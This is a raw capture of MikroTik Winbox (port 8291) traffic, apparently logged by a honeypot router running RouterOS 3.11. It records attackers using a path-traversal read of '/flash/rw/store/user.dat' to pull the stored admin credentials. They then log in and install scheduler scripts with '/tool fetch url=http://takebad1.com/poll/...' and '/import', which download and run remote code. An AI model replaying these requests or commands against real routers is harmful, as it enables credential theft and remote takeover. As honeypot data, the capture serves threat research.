3.0.152.10,8291,228.93.77.36,28241,"{bff0005:1,u2:32768,ufe0001:5,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
228.93.77.36,47260,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,98,87,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,4,23,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,228.93.77.36,47260,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,228.93.77.36,47260,"{ufe0001:6,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,228.93.77.36,47260,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
228.93.77.36,47260,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[26,54,80,78,18,13,171,17,81,215,107,250,63,44,221,75],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,228.93.77.36,47260,"{bff0005:1,uff0006:3,uff0007:1,s1:'api',r9:[26,54,80,78,18,13,171,17,81,215,107,250,63,44,221,75],ra:[0,205,113,129,8,146,54,46,86,120,130,152,158,182,209,244,25],Uff0001:[13,4],Uff0002:[0,11]}"
228.93.77.36,47260,3.0.152.10,8291,"{ub:392814,uf:32,u10:6,ufe0001:150,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,205,113,129,8,146,54,46,86,120,130,152,158,182,209,244,25],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,228.93.77.36,47260,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:6,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://takebad1.com/poll/bc658659-8fcc-4373-8f5e-66f154a527e3 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
4.17.164.125,61980,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:6,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,4.17.164.125,61980,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
4.17.164.125,61980,3.0.152.10,8291,"{u2:302,ufe0001:7,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
4.17.164.125,61980,3.0.152.10,8291,"{u2:302,ufe0001:7,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
205.160.226.41,14827,3.0.152.10,8291,"{u2:302,ufe0001:9,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,205.160.226.41,14827,"{bff0005:1,u2:32768,ufe0001:9,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
102.111.91.147,50256,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,102.111.91.147,50256,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
102.111.91.147,50256,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,41,11,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,126,252,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
18.28.204.197,57009,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[192,170,144,58,68,23,110,196,222,35,58,91,173,23,49,46],Uff0001:[0,11],Uff0002:[13,4]}"
18.28.204.197,57009,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1575]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:2,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:2,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:2,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:2,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:2,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:2,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
102.111.91.147,64571,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
102.111.91.147,64571,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[159,210,32,169,68,107,117,152,100,96,228,155,235,55,25,131],Uff0001:[0,11],Uff0002:[13,4]}"
102.111.91.147,64571,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:82,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,90,225,10,128,158,125,237,224,45,58,105,218,127,44,60,236],Uff0001:[0,11],Uff0002:[13,4]}"
0.195.172.118,51617,3.0.152.10,8291,"{ufe0001:0,uff0003:2,uff0006:3,Uff0001:[0,130],Uff0002:[48,3]}"
0.195.172.118,51617,3.0.152.10,8291,"{u2:302,ufe0001:4,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
188.33.205.49,59511,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,145,70,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,251,13,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
40.182.30.103,53864,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,59,95,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,251,13,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
40.182.30.103,53864,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[221,183,50,146,59,230,18,243,172,52,50,35,94,51,80,222],Uff0001:[0,11],Uff0002:[13,4]}"
71.201.0.1,64270,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
71.201.0.1,64270,3.0.152.10,8291,"{u2:302,ufe0001:7,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
28.172.64.41,56071,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,19,103,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,251,13,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
28.172.64.41,56071,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[49,230,119,204,163,107,50,129,67,156,157,27,223,45,176,239],Uff0001:[0,11],Uff0002:[13,4]}"
152.205.186.14,60888,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
152.205.186.14,60888,3.0.152.10,8291,"{u2:1209,ufe0001:9,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
152.205.186.14,60888,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[19,79,235,157,40,230,112,231,60,212,97,237,144,179,25,194],Uff0001:[0,11],Uff0002:[13,4]}"
190.208.101.200,58340,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
190.208.101.200,58340,3.0.152.10,8291,"{u2:1209,ufe0001:10,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
190.208.101.200,58340,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[242,21,25,224,198,75,148,97,69,254,205,178,52,216,237,13],Uff0001:[0,11],Uff0002:[13,4]}"
190.208.101.200,51923,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
190.208.101.200,51923,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
36.5.250.41,55763,3.0.152.10,8291,"{u2:302,ufe0001:11,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
141.223.32.41,59271,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,164,0,56,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,251,13,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,29.127.191.196,29235,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
29.127.191.196,29235,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,29.127.191.196,29235,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
29.127.191.196,29235,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,52,67,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,29.127.191.196,29235,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,29.127.191.196,55893,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
29.127.191.196,55893,3.0.152.10,8291,"{u2:1209,ufe0001:2,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,29.127.191.196,55893,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,29.127.191.196,55893,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
29.127.191.196,55893,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[150,16,162,191,120,217,45,33,43,134,201,14,25,219,34,99],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,29.127.191.196,55893,"{bff0005:1,uff0006:3,uff0007:1,s1:'user1',r9:[150,16,162,191,120,217,45,33,43,134,201,14,25,219,34,99],ra:[0,174,110,231,87,25,248,12,141,73,125,137,101,223,158,245,75],Uff0001:[13,4],Uff0002:[0,11]}"
29.127.191.196,12725,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
29.127.191.196,12725,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[2122]}"
3.0.152.10,8291,29.127.191.196,12725,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
29.127.191.196,12725,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,29.127.191.196,12725,"{ufe0001:3,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,29.127.191.196,12725,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
29.127.191.196,12725,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[51,206,113,194,234,155,163,20,109,100,168,226,98,208,88,25],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,29.127.191.196,12725,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[51,206,113,194,234,155,163,20,109,100,168,226,98,208,88,25],ra:[0,45,183,26,79,191,99,243,33,242,74,246,200,95,229,205,49],Uff0001:[13,4],Uff0002:[0,11]}"
29.127.191.196,12725,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:129,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,45,183,26,79,191,99,243,33,242,74,246,200,95,229,205,49],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,29.127.191.196,12725,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:3,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://1awesome.net/poll/c83ceb55-71d3-4735-8a09-75f4696832d9 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
144.227.80.190,49281,3.0.152.10,8291,"{ufe0001:0,uff0003:2,uff0006:3,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,144.227.80.190,49281,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
144.227.80.190,49281,3.0.152.10,8291,"{u2:302,ufe0001:4,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,144.227.80.190,49281,"{bff0005:1,u2:32768,ufe0001:4,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
22.99.134.178,58644,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,39,150,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,184,67,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,22.99.134.178,58644,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,102.111.91.147,64776,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,45.37.50.2,64958,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
211.94.64.125,41456,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
211.94.64.125,41456,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,211.94.64.125,41456,"{b109bf:1,b288c2:0,ubfc300:7,s1:'list'}"
211.94.64.125,34067,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1907]}"
137.252.90.178,14590,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
252.34.79.27,61996,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
252.34.79.27,61996,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
252.34.79.27,61996,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
252.34.79.27,61996,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
146.171.75.182,49620,3.0.152.10,8291,"{u2:302,ufe0001:3,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
146.171.75.182,49620,3.0.152.10,8291,"{u2:302,ufe0001:3,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
146.171.75.182,49620,3.0.152.10,8291,"{u2:1209,ufe0001:4,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
146.171.75.182,49620,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[219,217,2,223,138,108,74,213,195,243,215,254,149,71,178,136],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,50.100.248.197,55649,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
50.100.248.197,55649,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,50.100.248.197,55649,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
50.100.248.197,61926,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,77,40,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,50.100.248.197,61926,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
